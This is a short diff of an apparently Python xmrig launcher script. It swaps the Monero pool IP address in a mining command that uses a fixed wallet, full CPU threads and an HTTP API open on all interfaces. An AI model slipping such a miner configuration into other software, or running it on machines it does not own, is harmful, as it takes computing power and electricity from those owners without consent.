@@ -36,7 +36,7 @@ if operate_system == 'lin':
         pass
 import psutil
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
-command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+command_xmrig_default = '--algo randomx -o 51.161.80.235:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
     time.sleep(1)
